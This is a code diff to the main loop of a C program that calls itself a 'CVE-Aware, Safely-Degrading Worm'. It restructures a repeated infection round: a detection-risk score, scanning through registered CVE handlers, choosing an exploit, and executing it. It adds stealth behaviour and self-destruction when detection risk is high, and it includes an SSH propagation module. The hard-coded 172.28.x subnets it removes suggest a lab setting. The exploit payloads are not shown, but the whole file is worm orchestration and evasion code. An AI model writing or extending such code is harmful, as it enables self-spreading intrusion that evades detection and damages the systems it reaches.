@@ -9,29 +9,26 @@
 #include "state_manager.h"
 #include "degradation.h"
 #include "utils.h"
+#include "cve_ssh_propagation.h"
 
 // Configuration
-#define MAX_SUBNETS 4
-#define MAX_IP_LEN 16
 #define REMOTE_WORM_PATH "/tmp/worm"
 
-// Subnets to scan
-const char* SUBNETS[MAX_SUBNETS] = {
-    "172.28.1",
-    "172.28.2",
-    "172.28.3",
-    "172.28.4"
-};
-
 // Phase 1: Scan
+// Calls all registered scan handlers
+// Each handler decides what to scan (local or remote) internally
+// target_ip parameter may be ignored by handlers that perform their own scanning
 static cve_result_vector_t phase1_scan(const char* target_ip) {
     return scan_all_handlers(target_ip);
 }
 
 // Phase 2: Decision
+// Determines which CVE to execute based on scan results and risk assessment
+// Risk thresholds: <4 = normal, 4-6 = stealth, >=7 = self-destruct
 static decision_result_t phase2_decision(cve_result_vector_t* scan_results, 
                                          risk_assessment_t* risk) {
-    degradation_mode_t mode = MODE_NORMAL;  // Can be set based on risk
+    degradation_mode_t mode = MODE_NORMAL;
+    // Enter stealth mode if risk is high but not critical
     if (risk->total_risk >= 4 && risk->total_risk < 7) {
         mode = MODE_STEALTH;
     }
@@ -41,7 +38,7 @@ static decision_result_t phase2_decision(cve_result_vector_t* scan_results,
 
 // Phase 3: Execute
 static int phase3_execute(int cve_id, const char* target_ip, const char* argv0) {
-    (void)argv0;  // Suppress unused parameter warning (reserved for future self-replication)
+    (void)argv0;
     
     cve_handler_config_t* handler = get_handler(cve_id);
     if (!handler) {
@@ -49,94 +46,119 @@ static int phase3_execute(int cve_id, const char* target_ip, const char* argv0) 
         return 0;
     }
     
-    printf("[*] Executing CVE ID %d on %s...\n", cve_id, target_ip);
+    if (target_ip) {
+        printf("[*] Executing CVE ID %d on %s...\n", cve_id, target_ip);
+    } else {
+        printf("[*] Executing CVE ID %d...\n", cve_id);
+    }
     
-    // Execute execution handler
     int execution_success = call_execution_handler(handler, target_ip);
     
     if (execution_success) {
-        printf("[+] Execution successful on %s\n", target_ip);
-        
-        // TODO: Self-replication
-        // For now, self-replication is handled by execution scripts
-        // In the future, we can add:
-        // self_replicate(target_ip, argv0, REMOTE_WORM_PATH, execute_cmd_func);
-        
+        if (target_ip) {
+            printf("[+] Execution successful on %s\n", target_ip);
+        } else {
+            printf("[+] Execution successful\n");
+        }
         update_successful_operation();
         return 1;
     } else {
-        printf("[-] Execution failed on %s\n", target_ip);
+        if (target_ip) {
+            printf("[-] Execution failed on %s\n", target_ip);
+        } else {
+            printf("[-] Execution failed\n");
+        }
         update_failed_operation();
         return 0;
     }
 }
 
 int main(int argc, char* argv[]) {
-    (void)argc;  // Suppress unused parameter warning
+    (void)argc;
     
     printf("=== CVE-Aware, Safely-Degrading Worm ===\n");
     
-    // Initialize modules
     init_handler_registry();
     init_decision_rules();
     init_state();
     
-    // Delay to allow system to settle if just started
     sleep(2);
     
-    // Main loop with 4-phase engine
+    // Main infection loop: 4-phase engine (Risk Assessment -> Scan -> Decision -> Execute)
     while (1) {
         printf("\n[*] Starting infection round...\n");
         
-        // Phase 0: Risk Assessment
+        // Phase 0: Risk Assessment - evaluates detection signals before any operations
         risk_assessment_t risk = assess_risk();
-        printf("[*] Risk Assessment: Total=%d (Network=%d, System=%d, Behavioral=%d)\n",
-               risk.total_risk, risk.network_risk, risk.system_risk, risk.behavioral_risk);
+        printf("\n=== RISK ASSESSMENT ===\n");
+        printf("[*] Total Risk: %d/10\n", risk.total_risk);
+        printf("[*] Network Risk: %d/10\n", risk.network_risk);
+        printf("[*] System Risk: %d/10\n", risk.system_risk);
+        printf("[*] Behavioral Risk: %d/10\n", risk.behavioral_risk);
         
+        // Critical risk threshold: self-destruct to avoid detection
         if (risk.total_risk >= 7) {
+            printf("\n[!] CRITICAL RISK DETECTED (>= 7/10)\n");
+            printf("[!] Entering SELF-DESTRUCTION mode...\n");
             self_destruct();
             break;
         }
         
+        // High risk threshold: reduce activity but continue operations
         if (risk.total_risk >= 4) {
+            printf("\n[!] HIGH RISK DETECTED (>= 4/10)\n");
+            printf("[!] Entering STEALTH mode...\n");
             enter_stealth_mode();
-            continue;  // Loop back to risk assessment
+        } else {
+            printf("[+] Risk level acceptable, proceeding with normal operations\n");
         }
         
-        // Iterate targets
-        for (int i = 0; i < MAX_SUBNETS; i++) {
-            for (int host = 2; host < 4; host++) {
-                char ip[MAX_IP_LEN];
-                snprintf(ip, sizeof(ip), "%s.%d", SUBNETS[i], host);
-                
-                // Skip if already infected
-                if (is_infected(ip)) {
-                    printf("[*] %s already infected, skipping\n", ip);
-                    continue;
+        // Phase 1: Scan - call all scan handlers
+        // Each handler decides what to scan (local or remote) internally
+        printf("\n=== SCAN PHASE ===\n");
+        cve_result_vector_t scan_results = phase1_scan(NULL);
+        printf("[*] Scan complete: %d CVE handler(s) checked\n", scan_results.count);
+        
+        // Log scan results
+        printf("\n=== SCAN RESULTS ===\n");
+        for (int j = 0; j < scan_results.count; j++) {
+            cve_scan_result_t* result = &scan_results.results[j];
+            printf("[*] CVE ID %d: ", result->cve_id);
+            if (result->is_vulnerable) {
+                printf("VULNERABLE (confidence: %d/10", result->confidence);
+                if (result->port_open > 0) {
+                    printf(", port %d open", result->port_open);
                 }
-                
-                // Phase 1: Scan
-                printf("[*] Scanning %s...\n", ip);
-                cve_result_vector_t scan_results = phase1_scan(ip);
-                printf("[*] Scan complete: %d CVEs checked\n", scan_results.count);
-                
-                // Phase 2: Decision
-                decision_result_t decision = phase2_decision(&scan_results, &risk);
-                
-                if (!decision.should_execute) {
-                    printf("[*] No suitable CVE found for %s\n", ip);
-                    continue;
+                if (result->service_type[0] != '\0') {
+                    printf(", service: %s", result->service_type);
                 }
-                
-                printf("[*] Selected CVE ID %d for %s\n", decision.selected_cve_id, ip);
-                
-                // Phase 3: Execute
-                if (phase3_execute(decision.selected_cve_id, ip, argv[0])) {
-                    mark_infected(ip);
-                    printf("[+] Successfully infected %s\n", ip);
-                } else {
-                    update_failed_connection();
-                }
+                printf(")\n");
+            } else {
+                printf("NOT VULNERABLE (confidence: %d/10)\n", result->confidence);
+            }
+        }
+        
+        // Phase 2: Decision - select best CVE based on priority and conditions
+        printf("\n=== DECISION PHASE ===\n");
+        decision_result_t decision = phase2_decision(&scan_results, &risk);
+        
+        // Decision engine evaluates all registered CVEs in priority order
+        // First CVE that meets all criteria (vulnerable, port, confidence, risk, mode) is selected
+        if (!decision.should_execute) {
+            printf("[-] No suitable CVE selected\n");
+            printf("[-] Reason: No CVE met all decision criteria (vulnerable, port, confidence, risk, mode)\n");
+        } else {
+            printf("[+] Selected CVE ID %d for execution\n", decision.selected_cve_id);
+            
+            // Phase 3: Execute - run the selected CVE's execution handler
+            // Execution handler uses vulnerable hosts discovered during scan phase
+            printf("\n=== EXECUTION PHASE ===\n");
+            printf("[*] Executing CVE ID %d...\n", decision.selected_cve_id);
+            if (phase3_execute(decision.selected_cve_id, NULL, argv[0])) {
+                printf("[+] Execution successful\n");
+            } else {
+                printf("[-] Execution failed\n");
+                update_failed_connection();
             }
         }
         
